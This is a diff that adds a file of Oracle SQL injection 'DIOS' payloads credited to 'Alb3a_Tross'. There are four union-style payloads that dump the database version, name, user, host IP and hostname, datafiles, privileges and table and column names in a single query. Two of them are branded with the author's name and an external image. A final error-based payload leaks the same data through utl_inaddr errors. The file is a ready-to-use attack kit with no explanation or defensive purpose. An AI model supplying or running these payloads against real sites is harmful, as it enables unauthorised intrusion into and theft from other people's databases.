@@ -1,0 +1,40 @@
+Dios Number :1 
+
+concat('Injected By Alb3a_Tross','<br>'||'DB :: '||SYS.DATABASE_name||'<br>'||'USER :: '||user||'<br>'||'VERSION :: '||(SELECT BANNER from V$version where rownum=1)||'<br>'||'<br>'||(select wm_concat('<li>'||table_name||'='||column_name)from (select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<120))||'<!--'
+
+
+ from dual
+
+
+
+Dios Number :2
+
+(select wm_concat(table_name||column_name)from (select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<120)
+
+
+from dual
+ 
+ 
+ 
+ Dios Number:3
+ 
+ 
+ concat('INJECT BY Alb3a_Tross',''||'<br>'||'<br>'||'Print System'||'<br>'||'- VERSION :: '||'<br>'||(SELECT BANNER from V$version where rownum=1)||'<br>'||'- DATABASE :: '||'<br>'||SYS.DATABASE_name||'<br>'||'- HostName DNS and IP Address :: '||'<br>'||UTL_INADDR.get_host_address||'<br>'||(SELECT host_name FROM v$instance where rownum=1)||'<br>'||UTL_INADDR.get_host_name||'<br>'||'- USER :: '||user||'<br>'||'- DB FILLES :: '||(SELECT name FROM V$DATAFILE where rownum=1)||'<br>'||'- Privileges :: '||(SELECT grantee FROM dba_sys_privs where rownum=1)||'<br>'||'- Server operating system :: '||(select member from v$logfile where rownum=1)||'<br>'||'- The server sid :: '||(select instance_name from v$instance)||'<br>'||'<br>'||'DUMP DB'||'<br>'||(select wm_concat('<li>'||table_name||' ==> '||column_name)from (select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<120))||'<!--'
+
+from dual
+
+
+
+Dios Number :4
+
+
+concat('Alb3a_Tross','<img src="https://c.top4top.io/p_2033hvvtu0.jpg" height="190" width="190">'||'<br>'||'VERSION :: '||'<br>'||(SELECT BANNER from V$version where rownum=1)||'<br>'||'DATABASE :: '||'<br>'||SYS.DATABASE_name||'<br>'||'IP :: '||UTL_INADDR.get_host_address||'<br>'||'HOSTNAME :: '||(SELECT host_name FROM v$instance where rownum=1)||'<br>'||'USER :: '||user||'<br>'||'DB FILLES :: '||(SELECT name FROM V$DATAFILE where rownum=1)||'<br>'||'Privileges :: '||(SELECT grantee FROM dba_sys_privs where rownum=1)||'<br>'||'<br>'||'DUMP DB'||'<br>'||(select wm_concat('<li>'||table_name||' ==> '||column_name)from (select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<120))||'<!--' from dual--concat('Alb3a_Tross','<img src="https://c.top4top.io/p_2033hvvtu0.jpg" height="190" width="190">'||'<br>'||'VERSION :: '||'<br>'||(SELECT BANNER from V$version where rownum=1)||'<br>'||'DATABASE :: '||'<br>'||SYS.DATABASE_name||'<br>'||'IP :: '||UTL_INADDR.get_host_address||'<br>'||'HOSTNAME :: '||(SELECT host_name FROM v$instance where rownum=1)||'<br>'||'USER :: '||user||'<br>'||'DB FILLES :: '||(SELECT name FROM V$DATAFILE where rownum=1)||'<br>'||'Privileges :: '||(SELECT grantee FROM dba_sys_privs where rownum=1)||'<br>'||'<br>'||'DUMP DB'||'<br>'||(select wm_concat('<li>'||table_name||' ==> '||column_name)from (select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<120))||'<!--' 
+
+from dual
+
+
+Error Based Dios :
+
+or 1=utl_inaddr.get_host_name(((select banner from v$version where rownum=1)||user||sys.database_name||(select wm_concat(table_name||column_name)from (select rownum as rnum,table_name,column_name from all_tab_columns order by table_name desc) shell where rnum<25)))
+
+From Dual
